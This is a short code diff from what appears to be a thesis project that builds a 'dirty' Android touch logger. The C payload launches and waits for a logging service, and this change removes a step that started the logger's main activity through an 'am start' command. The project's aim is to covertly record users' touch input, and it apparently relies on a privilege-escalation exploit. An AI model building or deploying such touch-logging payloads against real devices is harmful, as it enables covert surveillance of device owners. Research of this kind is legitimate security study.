@@ -21,8 +21,6 @@ typedef int getcon_t(char** con);
 
 // TODO: figure out how to get this info from CMake script and pass it here
 #define PKNAME                  "org.leyfer.thesis.touchlogger_dirty"
-#define ACTIVITY                ".activity.MainActivity"
-#define BOOLEAN_EXTRA_KEY       "org.leyfer.thesis.extra.started_by_payload"
 #define SERVICE_PROCESS_NAME    "touchlogger.here"
 #define SERVICE                 ".service.PayloadWaitingService"
 #define ACTION                  "org.leyfer.thesis.touchlogger_dirty.service.action.WAIT_FOR_PAYLOAD"
@@ -181,24 +179,7 @@ int startServceAndWaitForItToBecomeOnline()
     if (isServiceProcessActive() == 0)
     {
       LOGV("Touchlogger android app started!");
-      int start_touchlogger_res = system(
-          "am start -n " PKNAME "/" ACTIVITY " --ez " BOOLEAN_EXTRA_KEY " true");
-
-      if (start_touchlogger_res == -1)
-      {
-        LOGV("Unable to start touchlogger!");
-        return -1;
-      }
-      else if (WEXITSTATUS(start_touchlogger_res) == 0)
-      {
-        LOGV("Touchlogger started successfully!");
-        return 0;
-      }
-      else
-      {
-        LOGV("Unable to start activity!");
-        return -1;
-      }
+      return 0;
     }
     else
     {
